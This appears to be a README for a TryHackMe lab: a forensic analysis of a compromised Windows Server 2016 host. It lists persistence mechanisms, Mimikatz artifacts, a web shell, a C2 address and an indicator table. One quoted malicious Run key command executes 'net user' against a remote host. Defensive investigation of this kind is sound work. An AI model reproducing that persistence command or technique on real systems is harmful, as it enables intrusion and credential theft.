# Investigating Windows — Host Compromise Analysis

> TryHackMe · Host-based DFIR on a compromised **Windows Server 2016** machine, using built-in Windows tooling.

## Overview

A host-based forensic investigation of a compromised Windows Server. The goal was to identify attacker activity, persistence mechanisms, credential access, and indicators of compromise, working entirely from the live host with native tools.

**System:** Windows Server 2016 Datacenter (build 14393), host `EC2AMAZ-I8UHO76`. Directory and event-log timestamps place the compromise on **03/02/2019**.

## Tools

Native Windows utilities — `systeminfo`, `net user` / `Get-LocalUser`, `reg` / Registry Editor, Task Scheduler, Event Viewer, and host file / firewall inspection.

## Key findings

- **Persistence — Registry Run key:** `UpdateSvc` running `C:\TMP\p.exe -s \10.34.2.3 'net user' > C:\TMP\o2.txt` (auto-exec + outbound to a remote host).
- **Persistence — Scheduled task:** `"Clean file system"` executing `C:\TMP\nc.ps1`, listening on port **1348**.
- **Privileged account misuse:** `Jenny` is an administrator that has **never logged on** — staged for attacker persistence.
- **Credential access:** `mim.exe` and output files in `C:\TMP` indicate **Mimikatz** credential dumping.
- **C2:** host reaches out to **10.34.2.3** on startup.
- **Web shell:** JSP web shell placed in the IIS webroot.
- **Defense tampering:** unauthorized firewall rule change.

## Indicators of compromise

| Type | Indicator |
|---|---|
| Remote/C2 IP | `10.34.2.3` |
| Malicious files | `C:\TMP\p.exe`, `C:\TMP\nc.ps1`, `mim.exe` |
| Listening port | `1348` |
| Persistence | Run key `UpdateSvc`; scheduled task `Clean file system` |
| Suspicious account | `Jenny` (admin, never logged on) |

## Evidence

![Malicious Registry Run key](evidence/screenshots/4_registry_update.png)
![Malicious scheduled task](evidence/screenshots/6_scheduled_task.png)
![Mimikatz artifacts](evidence/screenshots/10_mimikatz.png)
![Hosts file / C2 IP](evidence/screenshots/11_hostsfile_c2ip.png)

All 13 screenshots are in [`evidence/screenshots/`](evidence/screenshots/).

## Full report

📄 [windows_host_compromise_analysis.pdf](report/windows_host_compromise_analysis.pdf)

---

*Verdict: full system compromise — reimage and reset credentials. Originally published at `github.com/hordiikorol/investigating-windows-dfir`.*
